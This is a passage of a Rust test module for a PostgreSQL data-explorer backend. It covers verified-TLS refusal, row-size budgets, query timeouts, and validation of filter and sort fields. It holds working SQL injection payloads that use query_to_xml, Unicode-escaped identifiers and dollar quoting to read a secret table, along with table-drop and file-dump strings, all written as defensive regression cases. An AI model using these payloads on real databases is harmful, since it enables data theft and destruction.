        // the same helper it calls, rather than hand-rolling one here.
        //
        // The first version of this test built its own config with
        // `.ssl_mode(Require)` — which meant deleting `.ssl_mode(...)` from the
        // production path left the test still passing, since it was asserting
        // against its own copy. A regression test that cannot observe the
        // regression is worse than none: it reports safety it never checked.
        let resolved_host = resolve_host_once(&host, port)
            .await
            .expect("started PostgreSQL container host should resolve");
        let cfg = connect_config_for(&resolved_host, port, "postgres", "", "postgres");

        // Retry while the server finishes coming up, so a slow start is not
        // mistaken for the TLS refusal we are actually asserting.
        let mut last_err = None;
        for _ in 0..10 {
            match connect_with_verified_tls(&cfg).await {
                Ok(_) => panic!(
                    "SECURITY REGRESSION: the verified-TLS rung connected to a server with TLS \
                     disabled. That means SslMode is not Require and the connection is cleartext \
                     while reporting itself as verified — the lower rungs, including the \
                     host_is_private guard, become unreachable."
                ),
                Err(e) => {
                    last_err = Some(e.to_string());
                    tokio::time::sleep(std::time::Duration::from_millis(250)).await;
                }
            }
        }

        let err = last_err.expect("loop must record an error");
        assert!(
            err.contains("tls") || err.contains("TLS") || err.contains("does not support"),
            "expected a TLS-refusal error from the verified rung, got: {err}"
        );

        // And the ladder as a whole still works for this host, because 127.0.0.1
        // is private: it falls through to the explicit cleartext rung. Without
        // this half, "refuse TLS-less servers" would have broken every
        // self-hosted deployment whose Postgres has no certificate.
        let source = {
            let mut connected = None;
            for _ in 0..10 {
                match PostgresSource::connect(&host, port, "postgres", "", "postgres").await {
                    Ok(source) => {
                        connected = Some(source);
                        break;
                    }
                    Err(_) => tokio::time::sleep(std::time::Duration::from_millis(250)).await,
                }
            }
            connected.expect(
                "the ladder must still reach a private, TLS-less PostgreSQL via the cleartext rung",
            )
        };
        drop(source);
    }

    #[tokio::test]
    async fn oversized_first_row_is_rejected_by_real_postgres_query() {
        let container = match GenericImage::new("postgres", "18-alpine")
            .with_exposed_port(ContainerPort::Tcp(5432))
            .with_wait_for(WaitFor::message_on_stderr(
                "database system is ready to accept connections",
            ))
            .with_env_var("POSTGRES_DB", "postgres")
            .with_env_var("POSTGRES_USER", "postgres")
            .with_env_var("POSTGRES_HOST_AUTH_METHOD", "trust")
            .start()
            .await
        {
            Ok(container) => container,
            Err(error) if container_runtime_unavailable(&error.to_string()) => {
                eprintln!("Docker unavailable; skipping PostgreSQL row-budget test: {error}");
                return;
            }
            Err(error) => panic!("failed to start PostgreSQL row-budget container: {error}"),
        };
        let host = container
            .get_host()
            .await
            .expect("started PostgreSQL container must expose its host")
            .to_string();
        let port = container
            .get_host_port_ipv4(5432)
            .await
            .expect("started PostgreSQL container must expose port 5432");
        let source = std::sync::Arc::new(
            PostgresSource::connect(&host, port, "postgres", "", "postgres")
                .await
                .expect("started PostgreSQL container must accept source connections"),
        );
        source
            .client
            .batch_execute(
                "CREATE TABLE oversized_rows (id bigint, payload text); \
                 INSERT INTO oversized_rows VALUES (1, repeat('x', 2097152));",
            )
            .await
            .expect("oversized row fixture should be created");
        let budget = QueryBudget {
            max_bytes: 128 * 1024,
            max_cell_bytes: 64 * 1024,
            ..QueryBudget::default()
        };
        let error = source
            .query(
                &ContainerPath::from_slice(&["postgres", "public"]),
                "oversized_rows",
                None,
                QueryOptions {
                    limit: Some(1),
                    budget,
                    ..QueryOptions::default()
                },
            )
            .await
            .expect_err("the first oversized row must be rejected");
        assert!(matches!(
            error,
            DataError::ResultLimitExceeded {
                limit_kind: "wire_cell_bytes",
                ..
            }
        ));

        source
            .client
            .batch_execute(
                "CREATE TABLE array_rows (id bigint, tags text[]); \
                 INSERT INTO array_rows VALUES (1, ARRAY['alpha', 'beta']);",
            )
            .await
            .expect("array fixture should be created");
        let result = source
            .query(
                &ContainerPath::from_slice(&["postgres", "public"]),
                "array_rows",
                None,
                QueryOptions {
                    limit: Some(1),
                    budget,
                    ..QueryOptions::default()
                },
            )
            .await
            .expect("bounded PostgreSQL arrays should remain browsable");
        assert_eq!(result.rows[0]["tags"], serde_json::json!(["alpha", "beta"]));

        source
            .client
            .batch_execute(
                "CREATE TYPE browse_state AS ENUM ('ready', 'paused'); \
                 CREATE TABLE compatibility_types (\
                     state browse_state, address inet, duration interval, \
                     clock time with time zone, flags bit varying\
                 ); \
                 INSERT INTO compatibility_types VALUES (\
                     'ready', '192.0.2.1', interval '1 hour', '12:34:56+00', B'1010'\
                 );",
            )
            .await
            .expect("common PostgreSQL type fixture should be created");
        let compatible = source
            .query(
                &ContainerPath::from_slice(&["postgres", "public"]),
                "compatibility_types",
                None,
                QueryOptions {
                    limit: Some(1),
                    budget,
                    ..QueryOptions::default()
                },
            )
            .await
            .expect("common PostgreSQL built-ins and enums should remain browsable");
        assert_eq!(compatible.rows[0]["state"], serde_json::json!("ready"));
        assert_eq!(
            compatible.rows[0]["address"],
            serde_json::json!("192.0.2.1")
        );
        assert_eq!(compatible.rows[0]["flags"], serde_json::json!("1010"));

        source
            .client
            .batch_execute(
                "CREATE TABLE compressed_varbit_rows (id bigint, flags bit varying); \
                 INSERT INTO compressed_varbit_rows VALUES \
                     (1, repeat('1', 2097152)::bit varying);",
            )
            .await
            .expect("compressed varbit fixture should be created");
        let compressed_error = source
            .query(
                &ContainerPath::from_slice(&["postgres", "public"]),
                "compressed_varbit_rows",
                None,
                QueryOptions {
                    limit: Some(1),
                    budget,
                    ..QueryOptions::default()
                },
            )
            .await
            .expect_err("TOAST-compressed varbit must fail admission before JSON expansion");
        assert!(matches!(
            compressed_error,
            DataError::ResultLimitExceeded {
                limit_kind: "wire_cell_bytes",
                ..
            }
        ));

        source
            .client
            .batch_execute(
                "CREATE TYPE opaque_payload AS (secret text); \
                 CREATE TABLE extension_rows (id bigint, payload opaque_payload); \
                 INSERT INTO extension_rows VALUES (1, ROW('hidden')::opaque_payload);",
            )
            .await
            .expect("unsupported extension fixture should be created");
        let extension_row = source
            .query(
                &ContainerPath::from_slice(&["postgres", "public"]),
                "extension_rows",
                None,
                QueryOptions {
                    limit: Some(1),
                    budget,
                    ..QueryOptions::default()
                },
            )
            .await
            .expect("unsupported extension field must not hide supported row fields");
        assert_eq!(extension_row.rows[0]["id"], serde_json::json!(1));
        assert_eq!(extension_row.rows[0]["payload"], serde_json::Value::Null);

        source
            .client
            .batch_execute(
                "CREATE VIEW slow_rows AS \
                 SELECT 1::bigint AS id FROM (SELECT pg_sleep(0.2)) AS delay;",
            )
            .await
            .expect("slow view fixture should be created");
        let query_source = source.clone();
        let count_source = source.clone();
        let held_timeout_lock = source.query_timeout_lock.lock().await;
        let query_task = tokio::spawn(async move {
            query_source
                .query(
                    &ContainerPath::from_slice(&["postgres", "public"]),
                    "slow_rows",
                    None,
                    QueryOptions {
                        limit: Some(1),
                        timeout_ms: Some(10),
                        ..QueryOptions::default()
                    },
                )
                .await
        });
        // Queue the short-timeout row query first, then the count. The shared
        // mutex must keep count's 10s timeout from overwriting the row query's
        // 10ms timeout on their single PostgreSQL session.
        tokio::time::sleep(std::time::Duration::from_millis(25)).await;
        let count_task = tokio::spawn(async move {
            count_source
                .count(
                    &ContainerPath::from_slice(&["postgres", "public"]),
                    "slow_rows",
                    None,
                )
                .await
        });
        drop(held_timeout_lock);

        let query_error = query_task
            .await
            .expect("row query task should join")
            .expect_err("10ms row query must time out before the count changes the session");
        assert!(matches!(query_error, DataError::BackendQueryFailed { .. }));
        assert_eq!(
            count_task
                .await
                .expect("count task should join")
                .expect("count should inherit its own timeout"),
            1
        );

        let held_timeout_lock = source.query_timeout_lock.lock().await;
        let metadata_source = source.clone();
        let count_source = source.clone();
        let metadata_task = tokio::spawn(async move {
            metadata_source
                .row_count_and_size_with_timeout("public", "slow_rows", 10)
                .await
        });
        tokio::time::sleep(std::time::Duration::from_millis(25)).await;
        let count_task = tokio::spawn(async move {
            count_source
                .count(
                    &ContainerPath::from_slice(&["postgres", "public"]),
                    "slow_rows",
                    None,
                )
                .await
        });
        drop(held_timeout_lock);

        let (metadata_count, _) = metadata_task
            .await
            .expect("entity-info metadata task should join");
        assert_eq!(
            metadata_count, None,
            "entity-info fallback COUNT(*) must be cancelled by its own timeout"
        );
        assert_eq!(
            count_task
                .await
                .expect("post-metadata count task should join")
                .expect("count should receive its own timeout after entity-info"),
            1
        );
    }

    #[tokio::test]
    async fn test_quoted_function_identifier_rejected_by_real_query_paths() {
        let container = match GenericImage::new("postgres", "18-alpine")
            .with_exposed_port(ContainerPort::Tcp(5432))
            .with_wait_for(WaitFor::message_on_stderr(
                "database system is ready to accept connections",
            ))
            .with_env_var("POSTGRES_DB", "postgres")
            .with_env_var("POSTGRES_USER", "postgres")
            .with_env_var("POSTGRES_HOST_AUTH_METHOD", "trust")
            .start()
            .await
        {
            Ok(container) => container,
            Err(error) => {
                eprintln!("Docker unavailable; skipping PostgreSQL regression test: {error}");
                return;
            }
        };

        let host = container
            .get_host()
            .await
            .expect("started PostgreSQL container must expose its host")
            .to_string();
        let port = container
            .get_host_port_ipv4(5432)
            .await
            .expect("started PostgreSQL container must expose port 5432");

        // The container can emit its first readiness line during initialization;
        // retry while the final server process comes online.
        let source = {
            let mut connected = None;
            for _ in 0..10 {
                match PostgresSource::connect(&host, port, "postgres", "", "postgres").await {
                    Ok(source) => {
                        connected = Some(source);
                        break;
                    }
                    Err(_) => tokio::time::sleep(std::time::Duration::from_millis(250)).await,
                }
            }
            connected.expect("PostgreSQL test container must become reachable")
        };

        source
            .execute_raw(
                r#"CREATE TABLE public.public_users (id integer PRIMARY KEY, "'" integer NOT NULL);
                   INSERT INTO public.public_users VALUES (1, 1);
                   CREATE TABLE public.private_secrets (secret text NOT NULL);
                   INSERT INTO public.private_secrets VALUES ('synthetic-secret');
                   CREATE TABLE public.private_ids (id integer NOT NULL);
                   INSERT INTO public.private_ids VALUES (7);
                   CREATE FUNCTION public."in"() RETURNS boolean LANGUAGE sql STABLE AS
                   $$ SELECT EXISTS (
                       SELECT 1 FROM public.private_secrets
                       WHERE secret = 'synthetic-secret'
                   ) $$;"#,
            )
            .await
            .expect("test tables must be created");

        let path = ContainerPath::from_slice(&["postgres", "public"]);
        let attacks = [
            "\"query_to_xml\"('select secret from private_secrets', true, false, '')::text LIKE '%synthetic-secret%'",
            "U&\"query_to_xml\" UESCAPE '!'('select secret from private_secrets', true, false, '')::text LIKE '%synthetic-secret%'",
            "pg_catalog.U&\"query_to_xml\" UESCAPE '!'('select secret from private_secrets', true, false, '')::text LIKE '%synthetic-secret%'",
            "public.in()",
            "7 IN (TABLE private_ids)",
            "7 in (\nTaBlE\tprivate_ids)",
            r"E'x\'' IS NOT NULL AND query_to_xml('select secret from private_secrets', true, false, '')::text LIKE '%synthetic-secret%'",
            "$tag$'$tag$ IS NOT NULL AND query_to_xml('select secret from private_secrets', true, false, '')::text LIKE '%synthetic-secret%' AND $tail$'$tail$ IS NOT NULL",
            "$💣$'$💣$ IS NOT NULL AND query_to_xml('select secret from private_secrets', true, false, '')::text LIKE '%synthetic-secret%' AND $tail$'$tail$ IS NOT NULL",
            "\"'\" IS NOT NULL AND query_to_xml('select secret from private_secrets', true, false, '')::text LIKE '%synthetic-secret%' AND \"'\" IS NOT NULL",
        ];

        for attack in attacks {
            // Prove each expression is valid PostgreSQL and the quoted function
            // executes when it is not intercepted by the data-explorer validator.
            let direct_row = source
                .client
                .query_one(&format!("SELECT {attack} FROM public_users"), &[])
                .await
                .expect("quoted query_to_xml call must be valid PostgreSQL");
            assert!(direct_row.get::<_, bool>(0));

            let filters = Some(serde_json::json!({ "where": attack }));
            let query_error = source
                .query(
                    &path,
                    "public_users",
                    filters.clone(),
                    QueryOptions::default(),
                )
                .await
                .expect_err("query path must reject a quoted function identifier");
            assert!(matches!(query_error, DataError::InvalidQuery(_)));

            let count_error = source
                .count(&path, "public_users", filters)
                .await
                .expect_err("count path must reject a quoted function identifier");
            assert!(matches!(count_error, DataError::InvalidQuery(_)));
        }
    }

    #[test]
    fn test_sql_injection_arbitrary_function_call_blocked() {
        // Any function call is rejected, so we never have to enumerate them.
        assert_sql_rejected("length(password) > 0");
        assert_sql_rejected("1=1 AND cast(secret AS text) = 'x'");
        assert_sql_rejected("upper(name) = 'ADMIN'");
    }

    #[test]
    fn test_function_call_block_allows_grouping_and_in_lists() {
        // The new rule must not break legitimate grouping or IN-lists.
        assert_sql_allowed("(status = 'active' OR status = 'pending') AND id > 10");
        assert_sql_allowed("id IN (1, 2, 3)");
        assert_sql_allowed("id IN (1,2,3) AND NOT (deleted = true)");
        assert_sql_allowed("age >= 18 AND age <= 65");
    }

    #[test]
    fn test_sql_injection_copy() {
        assert_sql_rejected("1=1; copy users to '/tmp/dump'");
    }

    #[test]
    fn test_sql_injection_comment_hiding() {
        assert_sql_rejected("1=1 -- AND admin = false");
        assert_sql_rejected("1=1 /* hidden payload */");
    }

    #[test]
    fn test_sql_injection_into_clause() {
        assert_sql_rejected("1=1 into outfile '/tmp/data'");
    }

    #[test]
    fn test_sql_injection_execute_prepare() {
        assert_sql_rejected("execute evil_plan");
        assert_sql_rejected("prepare evil_plan as select * from users");
    }

    #[test]
    fn test_sql_injection_transaction_control() {
        assert_sql_rejected("begin ; drop table users");
        assert_sql_rejected("commit ; drop table users");
        assert_sql_rejected("rollback ; drop table users");
    }

    #[test]
    fn test_sql_injection_intersect_except() {
        assert_sql_rejected("1=1 intersect select * from admin_users");
        assert_sql_rejected("1=1 except select * from restricted");
    }

    #[test]
    fn test_sql_injection_empty_where() {
        assert_sql_rejected("");
        assert_sql_rejected("   ");
    }

    #[test]
    fn test_sql_injection_keyword_inside_string_literal_allowed() {
        // The word "drop" inside a string literal should NOT trigger rejection
        // because strip_sql_string_literals removes string content before checking
        assert_sql_allowed("description = 'drop this item'");
        assert_sql_allowed("name = 'select the best option'");
        assert_sql_allowed("note = 'please delete me'");
    }

    #[test]
    fn raw_filter_objects_are_rejected_before_query_construction() {
        let filters = serde_json::json!({"where": "status = 'active'"});
        assert!(PostgresSource::validate_filters(Some(&filters)).is_err());
        assert!(PostgresSource::validate_filters(None).is_ok());
        assert!(PostgresSource::validate_filters(Some(&serde_json::json!({}))).is_ok());
    }

    #[test]
    fn query_limit_is_capped() {
        assert_eq!(PostgresSource::clamp_limit(None), MAX_QUERY_LIMIT);
        assert_eq!(PostgresSource::clamp_limit(Some(25)), 25);
        assert_eq!(PostgresSource::clamp_limit(Some(10_000)), MAX_QUERY_LIMIT);
    }

    // ── Sort field validation tests ──────────────────────────────────

    #[test]
    fn test_sort_field_valid_simple() {
        assert!(PostgresSource::validate_sort_field("created_at").is_ok());
        assert!(PostgresSource::validate_sort_field("id").is_ok());
        assert!(PostgresSource::validate_sort_field("user_name").is_ok());
    }

    #[test]
    fn test_sort_field_valid_quoted() {
        assert!(PostgresSource::validate_sort_field("\"created_at\"").is_ok());
    }

    #[test]
    fn test_sort_field_valid_schema_qualified() {
        assert!(PostgresSource::validate_sort_field("schema.column").is_ok());
    }

    #[test]
    fn test_sort_field_injection_blocked() {
        assert!(PostgresSource::validate_sort_field("id; DROP TABLE users--").is_err());
        assert!(PostgresSource::validate_sort_field("").is_err());
        assert!(PostgresSource::validate_sort_field("id OR 1=1").is_err());
    }

    #[test]
    fn test_sort_field_quoted_injection_blocked() {
        // Double quotes inside a quoted identifier should be rejected
        assert!(PostgresSource::validate_sort_field("\"id\"; DROP TABLE users--\"").is_err());
    }
}
